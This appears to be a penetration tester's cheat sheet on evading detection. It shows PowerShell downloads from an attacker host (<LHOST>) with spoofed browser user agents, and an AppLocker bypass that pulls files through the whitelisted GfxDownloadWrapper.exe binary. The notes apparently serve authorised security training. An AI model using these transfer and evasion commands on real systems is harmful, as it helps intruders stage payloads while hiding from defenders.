# Evading Detection

## User Agent Spoofing

List built-in PS user agent strings to pick one matching the target environment:

```powershell
[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl
```

Download with spoofed UA — swap `Chrome` for `InternetExplorer`, `FireFox`, `Opera`, or `Safari`:

```powershell
$UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
Invoke-WebRequest http://<LHOST>/<FILE> -UserAgent $UserAgent -OutFile <OUTFILE>
```

> [!tip] Match the UA to what's actually used internally — if the org runs Chrome, use Chrome. A Firefox UA on an IE-only environment is still an anomaly.

## AppLocker / Whitelisting Bypass

PS and nc blocked → find an approved LOLBin that has download capability. Example — GfxDownloadWrapper.exe (Intel Graphics Driver, present on some hosts):

```powershell
GfxDownloadWrapper.exe "http://<LHOST>/<FILE>" "<OUTPATH>"
```

Whitelisted binaries won't trigger AppLocker and are often excluded from EDR alerting. Check LOLBAS for what's actually present on the target — `dir C:\Windows\System32\` and cross-reference.

> [!tip] There's no universal LOLBin — what's installed varies per host. Before burning a technique, `dir` the system and check LOLBAS for matches. GTFOBins covers ~40 Linux binaries with transfer capability for the same purpose on Linux targets.